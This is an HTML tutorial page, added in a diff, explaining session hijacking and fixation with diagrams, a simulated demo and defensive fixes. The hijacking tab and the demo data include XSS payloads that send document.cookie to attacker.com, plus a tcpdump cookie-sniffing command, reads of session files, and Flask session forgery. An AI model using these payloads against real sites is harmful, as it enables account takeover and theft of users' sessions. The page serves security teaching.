@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Session Fixation & Hijacking</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.b-teal{background:#0a2020;color:#2dd4bf}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:110px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+</style>
+</head>
+<body>
+<h1>Session Fixation &amp; Hijacking</h1>
+<p class="sub">CWE-384 · CWE-287 · Steal or force a session token — then impersonate the victim without knowing their password</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">How it works</button>
+  <button class="tab-btn" onclick="showTab('hijacking',this)">Session hijacking</button>
+  <button class="tab-btn" onclick="showTab('fixation',this)">Session fixation</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('weak',this)">Weak session IDs</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- CONCEPT -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">A session token is the key that proves authentication — steal it and you own the account without needing the password. Session attacks fall into two categories: <strong style="color:#e2e2e6;font-weight:600">hijacking</strong> (stealing an existing valid token) and <strong style="color:#e2e2e6;font-weight:600">fixation</strong> (forcing the victim to use a token you already know).</p>
+
+  <svg width="100%" viewBox="0 0 680 280" style="max-width:680px;display:block;margin:0 auto 14px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+
+    <!-- Hijacking side -->
+    <text x="170" y="20" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Session Hijacking</text>
+    <rect x="20" y="34" width="300" height="230" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <rect x="60" y="50" width="100" height="40" rx="6" fill="#0d1f3a" stroke="#60a5fa" stroke-width="0.8"/>
+    <text x="110" y="74" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="system-ui">Victim: logged in</text>
+    <rect x="185" y="50" width="100" height="40" rx="6" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="235" y="74" text-anchor="middle" font-size="10" fill="#4ade80" font-family="system-ui">Server: session DB</text>
+    <line x1="162" y1="70" x2="183" y2="70" stroke="#888" stroke-width="0.8" marker-end="url(#arr)"/>
+    <text x="172" y="63" text-anchor="middle" font-size="9" fill="#888" font-family="system-ui">abc123</text>
+
+    <rect x="60" y="120" width="260" height="58" rx="6" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="190" y="140" text-anchor="middle" font-size="10" font-weight="600" fill="#f87171" font-family="system-ui">Attacker steals cookie</text>
+    <text x="190" y="157" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">XSS / network sniff / URL leak</text>
+    <text x="190" y="170" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">session=abc123</text>
+
+    <rect x="60" y="210" width="260" height="40" rx="6" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="190" y="234" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui">Attacker sends: Cookie: session=abc123 → OWNS ACCOUNT</text>
+
+    <!-- Fixation side -->
+    <text x="510" y="20" text-anchor="middle" font-size="11" font-weight="600" fill="#fbbf24" font-family="system-ui">Session Fixation</text>
+    <rect x="360" y="34" width="300" height="230" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <rect x="400" y="50" width="220" height="36" rx="6" fill="#1e1030" stroke="#c084fc" stroke-width="0.8"/>
+    <text x="510" y="72" text-anchor="middle" font-size="10" fill="#c084fc" font-family="system-ui">Attacker gives victim: session=KNOWN_ID</text>
+    <rect x="400" y="106" width="220" height="36" rx="6" fill="#0d1f3a" stroke="#60a5fa" stroke-width="0.8"/>
+    <text x="510" y="128" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="system-ui">Victim logs in with that session ID</text>
+    <rect x="400" y="162" width="220" height="36" rx="6" fill="#2a1a08" stroke="#fbbf24" stroke-width="0.8"/>
+    <text x="510" y="184" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="system-ui">Server upgrades SAME token to authenticated</text>
+    <rect x="400" y="218" width="220" height="36" rx="6" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="510" y="240" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui">Attacker uses KNOWN_ID → victim's session!</text>
+
+    <line x1="510" y1="88" x2="510" y2="104" stroke="#888" stroke-width="1" marker-end="url(#arr)"/>
+    <line x1="510" y1="144" x2="510" y2="160" stroke="#888" stroke-width="1" marker-end="url(#arr)"/>
+    <line x1="510" y1="200" x2="510" y2="216" stroke="#888" stroke-width="1" marker-end="url(#arr)"/>
+  </svg>
+</div>
+
+<!-- SESSION HIJACKING -->
+<div class="tab-panel" id="tab-hijacking">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Session hijacking requires stealing a valid session token. Here are all the ways it leaks.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9312; XSS — the primary cookie theft vector</span><span class="badge b-red">Critical</span>
+    </div>
+    <div class="code">&lt;!-- If HttpOnly is NOT set on the session cookie: --&gt;
+&lt;script&gt;
+// Read cookie and exfiltrate
+document.location = 'https://attacker.com/steal?c=' + document.cookie;
+// OR:
+new Image().src = 'https://attacker.com/steal?c=' + btoa(document.cookie);
+// OR via fetch:
+fetch('https://attacker.com/steal', {
+  method: 'POST',
+  body: document.cookie
+});
+&lt;/script&gt;
+
+// HttpOnly flag blocks document.cookie access
+// But XSS can still make authenticated requests directly:
+fetch('/api/transfer', {credentials:'include', method:'POST', body:'to=attacker&amp;amount=1000'});</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9313; Session token in URL — Referer leakage</span><span class="badge b-red">High</span>
+    </div>
+    <div class="code"># Some apps pass session as URL parameter instead of cookie:
+https://app.com/dashboard?session=abc123def456
+
+# This session token is now:
+# - Visible in browser address bar
+# - Stored in browser history
+# - Sent in Referer header to ALL external resources (analytics, ads, CDNs)
+# - Logged in server access logs
+# - Stored by any proxy/CDN in the path
+
+# Referer header leak:
+GET /analytics HTTP/1.1
+Host: analytics.third-party.com
+Referer: https://app.com/dashboard?session=abc123def456
+# → Third party has the session token!</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9314; Network interception — unencrypted cookies</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code"># Cookie without Secure flag sent over HTTP:
+GET /dashboard HTTP/1.1
+Host: app.com
+Cookie: session=abc123   ← plaintext on the wire!
+
+# On public WiFi: attacker runs:
+tcpdump -i wlan0 -A 'tcp port 80' | grep -i cookie
+# Captures session tokens in plaintext
+
+# Even HTTPS sites are vulnerable if:
+# 1. Session cookie lacks Secure flag (sent over HTTP too)
+# 2. App responds to HTTP without HSTS (SSL stripping possible)
+# 3. Mixed content loads HTTP resources with cookie
+
+# Cookie with Secure flag: only sent over HTTPS — not capturable this way</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9315; Subdomain cookie scope attack</span><span class="badge b-purple">Medium</span>
+    </div>
+    <div class="code"># Cookie scoped to parent domain (.app.com) is sent to ALL subdomains
+Set-Cookie: session=abc123; Domain=.app.com; HttpOnly; Secure
+
+# If ANY subdomain has XSS or is attacker-controlled (subdomain takeover):
+# - evil.app.com gets the session cookie in requests
+# - XSS on docs.app.com can read cookies from .app.com
+# (HttpOnly blocks JS read, but request-based steal still works)
+
+# Cookies scoped to exact domain only: no leading dot
+Set-Cookie: session=abc123; Domain=app.com  # safe — exact domain only</div>
+  </div>
+</div>
+
+<!-- SESSION FIXATION -->
+<div class="tab-panel" id="tab-fixation">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Session fixation is the inverse of hijacking — the attacker doesn't steal a token, they plant one they already know, then wait for the victim to authenticate with it.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Classic session fixation attack</span><span class="badge b-red">High</span>
+    </div>
+    <div class="code"># Step 1: Attacker visits app, gets a pre-auth session token
+GET https://app.com/
+Set-Cookie: session=ATTACKER_KNOWN_TOKEN
+
+# Step 2: Attacker sends victim a link that sets this session
+# Method A: URL parameter (if app accepts session via URL)
+https://app.com/login?session=ATTACKER_KNOWN_TOKEN
+
+# Method B: Meta refresh
+&lt;meta http-equiv="Set-Cookie" content="session=ATTACKER_KNOWN_TOKEN"&gt;
+
+# Method C: If attacker controls a subdomain (XSS / takeover)
+document.cookie = "session=ATTACKER_KNOWN_TOKEN; domain=.app.com; path=/";
+
+# Step 3: Victim clicks link → logs in
+# Vulnerable server: "session exists, just upgrade it to authenticated"
+# Server marks ATTACKER_KNOWN_TOKEN as authenticated for victim's account
+
+# Step 4: Attacker uses ATTACKER_KNOWN_TOKEN → now authenticated as victim!</div>
+  </div>
+
+  <div class="sc-card sc-amber">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">The fix — regenerate session ID on privilege change</div>
+    <div class="code"># The root cause: server reuses the same session token before and after login
+# Fix: issue a BRAND NEW session ID on every privilege change
+
+# Vulnerable code (PHP):
+session_start();
+// ... validate credentials ...
+$_SESSION['user'] = $user;  // WRONG: same session ID still in use!
+
+# Secure code (PHP):
+session_start();
+// ... validate credentials ...
+session_regenerate_id(true);  // ← destroys old session, creates new ID
+$_SESSION['user'] = $user;    // new session ID now holds the authenticated state
+
+# Also regenerate on:
+# - Login (unauthenticated → authenticated)
+# - Privilege escalation (user → admin)
+# - Password change
+# - Logout (authenticated → anonymous) — invalidate the old ID</div>
+  </div>
+</div>
+
+<!-- DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate session attacks and see how cookie flags and server behaviour determine whether they succeed.</p>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">Attack scenario</div>
+    <select id="session-select" onchange="runDemo()" style="width:100%;font-family:system-ui;">
+      <option value="xss_cookie">XSS cookie theft — no HttpOnly</option>
+      <option value="url_leak">Session in URL — Referer leak</option>
+      <option value="fixation">Session fixation — login not regenerating</option>
+      <option value="network">Plaintext HTTP — network sniff</option>
+      <option value="secure_session">Properly secured session</option>
+    </select>
+  </div>
+
+  <div style="margin-bottom:8px;">
+    <div class="chip">Cookie configuration &amp; attack setup</div>
+    <div class="mono-out" id="setup-out" style="min-height:80px;"></div>
+  </div>
+
+  <div class="grid2">
+    <div><div class="chip">Attack execution</div><div class="mono-out" id="attack-out" style="min-height:110px;"></div></div>
+    <div><div class="chip">Result</div><div class="mono-out" id="result-out" style="min-height:110px;"></div></div>
+  </div>
+  <div id="verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- WEAK SESSION IDs -->
+<div class="tab-panel" id="tab-weak">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Beyond stealing tokens — what if you can predict or calculate them?</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Predictable session tokens</div>
+    <div class="code"># Examples of dangerously weak session IDs seen in the wild:
+
+# Sequential integers
+session=1001, 1002, 1003...  → enumerate other users' sessions!
+
+# Timestamp-based
+session=1711670400000         → millisecond timestamp — guessable
+
+# User ID only
+session=user_42               → completely predictable
+
+# MD5 of predictable data
+session=md5(username + timestamp)  → if attacker knows username, can brute-force timestamp
+
+# Short tokens (too few bits of entropy)
+session=a3f9                  → 4 hex chars = 65,536 possibilities → brute forceable
+
+# Test for weak tokens:
+# 1. Log in multiple times, collect session IDs
+# 2. Look for patterns: sequential, timestamp-based, short
+# 3. Try incrementing/decrementing IDs
+# 4. Run Burp Sequencer to statistically analyze entropy
+
+# Burp Sequencer — analyze token randomness:
+# Intercept session cookie → Send to Sequencer → Analyze
+# Reports: effective bits of entropy (should be 128+ bits)</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Session puzzling — shared tokens, collision attacks</div>
+    <div class="code"># Session variable confusion:
+# App uses same session variable for different purposes
+# $_SESSION['user'] used for both: login state AND password reset token
+
+# Attacker triggers password reset for their own account:
+# $_SESSION['user'] = 'attacker_reset_token'
+# Then navigates to a page that checks $_SESSION['user'] for login
+# Server sees session variable set → treats as logged in!
+
+# Flask/Python — insecure client-side session (signed but not encrypted)
+# Flask default: session stored in cookie as base64(JSON), signed with SECRET_KEY
+# If SECRET_KEY is weak or leaked: forge any session value
+import flask_unsign
+token = flask_unsign.sign({'user_id': 1, 'role': 'admin'}, secret='secret')
+# → Full admin session with weak secret</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Session donation / cross-user contamination</div>
+    <div class="code"># Scenario: shared hosting or misconfigured server
+# Multiple users' sessions stored in the same file/DB with predictable keys
+
+# PHP default: session stored in /tmp/sess_[SESSION_ID]
+# If /tmp is world-readable: any local user can read sessions!
+ls /tmp/sess_*
+cat /tmp/sess_abc123  # → serialized session data including auth state
+
+# Shared cache poisoning:
+# If session stored in shared Redis without proper namespacing:
+redis-cli GET "session:abc123"  # → victim's session data
+
+# Fix: use strong namespacing and access controls for session storage</div>
+  </div>
+</div>
+
+<!-- FIXES -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9312; Regenerate session ID on every privilege change <span class="badge b-red">Fixes fixation</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">The single most important fix for session fixation. Issue a brand new session ID at login, privilege escalation, and logout.</div>
+    <div class="code">## Node.js / Express
+app.post('/login', async (req, res) => {
+  const user = await authenticate(req.body);
+  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+  // Regenerate session ID — destroys old session, creates new one
+  req.session.regenerate((err) => {
+    req.session.userId = user.id;
+    req.session.role   = user.role;
+    res.json({ success: true });
+  });
+});
+
+// Also on logout: destroy the session entirely
+app.post('/logout', (req, res) => {
+  req.session.destroy();
+  res.clearCookie('connect.sid');
+  res.redirect('/');
+});</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9313; Set all four cookie security flags <span class="badge b-green">Essential</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Each flag blocks a different attack vector. All four should be set on every session cookie.</div>
+    <div class="code">## Node.js / Express
+app.use(session({
+  secret: process.env.SESSION_SECRET,
+  name: '__Host-session',         // __Host- prefix: forces Secure + no Domain
+  cookie: {
+    httpOnly: true,               // blocks document.cookie XSS theft
+    secure: true,                 // only sent over HTTPS
+    sameSite: 'strict',           // blocks CSRF + cross-site leakage
+    maxAge: 30 * 60 * 1000,       // 30-minute expiry
+    domain: 'app.example.com',    // exact domain — not .app.example.com
+    path: '/'
+  }
+}));
+
+## Python / Django settings.py
+SESSION_COOKIE_HTTPONLY = True
+SESSION_COOKIE_SECURE   = True
+SESSION_COOKIE_SAMESITE = 'Strict'
+SESSION_COOKIE_AGE      = 1800    # 30 minutes
+SESSION_COOKIE_DOMAIN   = None    # exact current domain</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9314; Use cryptographically strong session IDs <span class="badge b-green">Essential</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Session IDs must be unpredictable — at least 128 bits of entropy from a CSPRNG. Never use sequential IDs, timestamps, or hashes of predictable data.</div>
+    <div class="code">## Node.js — use express-session with default crypto.randomBytes
+// express-session generates 128-bit random IDs by default
+// Never override genid with predictable logic
+
+## Python
+import secrets
+session_id = secrets.token_urlsafe(32)  # 256 bits of entropy
+
+## PHP — use session_regenerate_id() — PHP's built-in CSPRNG
+// Never roll your own: no md5(time()), no uniqid()
+
+## Verify with Burp Sequencer:
+// Collect 100+ session tokens → Sequencer → Analyze
+// "Effective entropy" should be 100+ bits</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9315; Implement session timeout and binding <span class="badge b-amber">Defence in depth</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Even stolen tokens should expire quickly. Binding the session to additional context (IP, User-Agent) makes stolen tokens harder to reuse — though not foolproof.</div>
+    <div class="code">## Absolute and idle timeout
+session.absolute_timeout = 8 * 60 * 60   # 8 hours max
+session.idle_timeout = 30 * 60            # 30 min inactivity
+
+if (Date.now() - session.lastActivity > IDLE_TIMEOUT) {
+  session.destroy();
+  return res.redirect('/login?reason=timeout');
+}
+session.lastActivity = Date.now();
+
+## Soft session binding (anomaly detection, not hard block)
+// On session use, check if IP or UA changed significantly
+// Log and alert, optionally require re-auth for sensitive actions
+// Don't hard-block on IP change alone — mobile users roam</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9316; Checklist</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Regenerate session ID on login, privilege change, and logout &nbsp;·&nbsp;
+      Set HttpOnly — blocks JS cookie theft via XSS &nbsp;·&nbsp;
+      Set Secure — only sent over HTTPS &nbsp;·&nbsp;
+      Set SameSite=Strict — blocks cross-site leakage and CSRF &nbsp;·&nbsp;
+      Use <code style="font-family:'Courier New',monospace">__Host-</code> cookie prefix for maximum scope restrictions &nbsp;·&nbsp;
+      Never put session tokens in URLs &nbsp;·&nbsp;
+      128+ bits entropy from CSPRNG — never sequential or timestamp-based &nbsp;·&nbsp;
+      Idle and absolute session timeouts &nbsp;·&nbsp;
+      On logout: destroy server-side session, clear cookie, redirect
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const DEMOS={
+  xss_cookie:{
+    setup:`Set-Cookie: session=abc123xyz789; Path=/
+# Missing flags:
+# ✗ No HttpOnly   ← JS can read document.cookie!
+# ✗ No Secure     ← sent over HTTP
+# ✗ No SameSite   ← sent cross-site`,
+    attack:`// XSS payload injected into page:
+&lt;script&gt;
+  // Steal cookie via image beacon:
+  new Image().src = 'https://attacker.com/steal?c='
+    + encodeURIComponent(document.cookie);
+&lt;/script&gt;
+
+// Attacker's server receives:
+// GET /steal?c=session%3Dabc123xyz789
+// → cookie: session=abc123xyz789`,
+    result:`# Attacker's server log:
+10.10.14.5 "GET /steal?c=session%3Dabc123xyz789" 200
+
+# Attacker sets stolen cookie in their browser:
+document.cookie = "session=abc123xyz789; path=/";
+
+# Request to app.com → recognized as victim's session:
+GET /dashboard HTTP/1.1
+Cookie: session=abc123xyz789
+→ HTTP 200: Welcome back, Alice! (victim's account)`,
+    verdict:'<strong>Session token stolen via XSS!</strong> The missing HttpOnly flag allowed JavaScript to read document.cookie. A single XSS payload exfiltrated the session token. The fix: HttpOnly prevents JS access to the cookie entirely — XSS can still make authenticated requests, but can\'t steal the raw token.'
+  },
+  url_leak:{
+    setup:`# Session token passed in URL (not in cookie):
+https://app.com/dashboard?sessionid=abc123xyz789
+
+# This token is now in:
+# ✗ Browser address bar (visible to user, shoulder surfing)
+# ✗ Browser history (stored permanently)
+# ✗ Server access logs (logged at app + CDN + proxy)
+# ✗ Referer header to all third-party resources`,
+    attack:`# Victim visits: https://app.com/dashboard?sessionid=abc123xyz789
+# Page loads Google Analytics:
+GET /analytics.js HTTP/1.1
+Host: www.google-analytics.com
+Referer: https://app.com/dashboard?sessionid=abc123xyz789
+
+# Session token delivered to Google Analytics!
+# Same for: Hotjar, Intercom, Zendesk, any CDN asset
+
+# Also: victim shares link → pastes URL in Slack, email
+# URL contains session → whoever receives link is logged in as victim!`,
+    result:`# Third-party server logs:
+"Referer: https://app.com/dashboard?sessionid=abc123xyz789"
+
+# Attacker requests the URL directly:
+GET https://app.com/dashboard?sessionid=abc123xyz789
+→ HTTP 200: Alice's dashboard, full account access
+
+# Or from browser history after device theft:
+chrome://history → search "app.com" → copy URL → instant access`,
+    verdict:'<strong>Session token leaked via URL and Referer!</strong> Session tokens must only travel in cookies (HttpOnly, Secure, SameSite). URLs are logged, cached, shared, and leaked to third parties via Referer. A token in a URL has an indefinite exposure window.'
+  },
+  fixation:{
+    setup:`# Attacker obtains a pre-auth session token:
+GET https://app.com/
+Set-Cookie: session=ATTACKER_KNOWN_ID
+
+# Attacker sends victim a link:
+https://app.com/login?session=ATTACKER_KNOWN_ID
+# App accepts session from URL parameter and sets it as cookie`,
+    attack:`# Victim clicks link → browser sets:
+Cookie: session=ATTACKER_KNOWN_ID
+
+# Victim logs in normally:
+POST /login
+Cookie: session=ATTACKER_KNOWN_ID
+username=alice&password=correct_password
+
+# Vulnerable server — DOES NOT regenerate session ID:
+# Just marks the existing session as authenticated:
+sessions["ATTACKER_KNOWN_ID"] = {user: "alice", authenticated: true}`,
+    result:`# Attacker now uses their known token:
+GET /dashboard
+Cookie: session=ATTACKER_KNOWN_ID
+
+HTTP 200 OK
+Welcome, Alice! Your balance: $50,000
+
+# Attacker has full access to Alice's authenticated session
+# WITHOUT ever knowing Alice's password
+# WITHOUT stealing any cookie from Alice's browser
+
+# Fix: session.regenerate() on login creates a new, unknown ID`,
+    verdict:'<strong>Session fixation — victim authenticated an attacker-controlled token!</strong> The server accepted a pre-existing session ID through login without regenerating it. The attacker planted the token before authentication; after the victim logged in, the server linked that known token to the victim\'s account. Fix: session.regenerate() on every login.'
+  },
+  network:{
+    setup:`# Cookie without Secure flag:
+Set-Cookie: session=abc123xyz789; HttpOnly; Path=/
+# Missing: Secure flag!
+
+# Site responds to both HTTP and HTTPS
+# HSTS not configured → no forced redirect to HTTPS
+
+# Victim on public WiFi → attacker on same network`,
+    attack:`# Attacker runs packet capture on WiFi:
+tcpdump -i wlan0 -A 'tcp port 80' | grep -i 'cookie:'
+
+# Victim visits http://app.com (no HTTPS):
+GET /dashboard HTTP/1.1
+Host: app.com
+Cookie: session=abc123xyz789    ← PLAINTEXT!
+
+# Captured in attacker's terminal:
+Cookie: session=abc123xyz789`,
+    result:`# Attacker uses captured cookie:
+curl -b "session=abc123xyz789" https://app.com/dashboard
+→ HTTP 200: Alice's account
+
+# Even on HTTPS, cookie without Secure flag is sent on HTTP:
+# If browser has ANY HTTP bookmark or link to app.com:
+# http://app.com/page → sends cookie in cleartext
+# SSL stripping attack forces HTTP even for HTTPS sites without HSTS`,
+    verdict:'<strong>Session cookie captured via network sniffing!</strong> The missing Secure flag allowed the cookie to be sent over HTTP in plaintext. On a shared network, any attacker can passively capture it. Fix: Secure flag ensures the cookie is only ever sent over encrypted HTTPS connections.'
+  },
+  secure_session:{
+    setup:`# Properly configured session cookie:
+Set-Cookie: __Host-session=RANDOM_128BIT_TOKEN;
+  HttpOnly;          ← JS cannot read it
+  Secure;            ← HTTPS only
+  SameSite=Strict;   ← not sent cross-site
+  Path=/;            ← required by __Host- prefix
+  Max-Age=1800       ← 30 min expiry
+
+# __Host- prefix enforces: Secure + no Domain + Path=/`,
+    attack:`# XSS attempt:
+document.cookie   → "" (HttpOnly blocks this)
+
+# Network sniff:
+Cookie only sent over HTTPS → encrypted → unreadable
+
+# Session fixation attempt:
+POST /login → server calls session.regenerate()
+→ New random token issued after login
+→ Attacker's pre-planted token invalidated
+
+# Cross-site CSRF/leakage:
+SameSite=Strict → cookie not sent on cross-site requests`,
+    result:`# All attack vectors blocked:
+
+XSS cookie theft:     BLOCKED (HttpOnly)
+Network capture:      BLOCKED (Secure + HTTPS)
+Session fixation:     BLOCKED (regenerate on login)
+CSRF via cookie:      BLOCKED (SameSite=Strict)
+Cross-site leakage:   BLOCKED (SameSite=Strict)
+Subdomain scope:      BLOCKED (__Host- prefix)
+Token prediction:     BLOCKED (128-bit CSPRNG)
+
+→ Session is properly secured`,
+    verdict:'<strong>All session attacks blocked by proper configuration!</strong> The combination of HttpOnly + Secure + SameSite=Strict + __Host- prefix + session.regenerate() + CSPRNG tokens covers every session attack vector covered in this module. This is the target configuration for every session cookie.'
+  }
+};
+
+function runDemo(){
+  const k=document.getElementById('session-select').value;
+  const d=DEMOS[k];
+  document.getElementById('setup-out').innerHTML='<span style="color:#888">'+d.setup+'</span>';
+  document.getElementById('attack-out').innerHTML='<span style="color:#fbbf24">'+d.attack+'</span>';
+  document.getElementById('result-out').innerHTML='<span style="color:'+( k==='secure_session'?'#4ade80':'#f87171')+'">'+d.result+'</span>';
+  const v=document.getElementById('verdict');
+  v.className='result-box r-'+(k==='secure_session'?'green':'red');
+  v.innerHTML=d.verdict;
+}
+runDemo();
+</script>
+</body>
+</html>
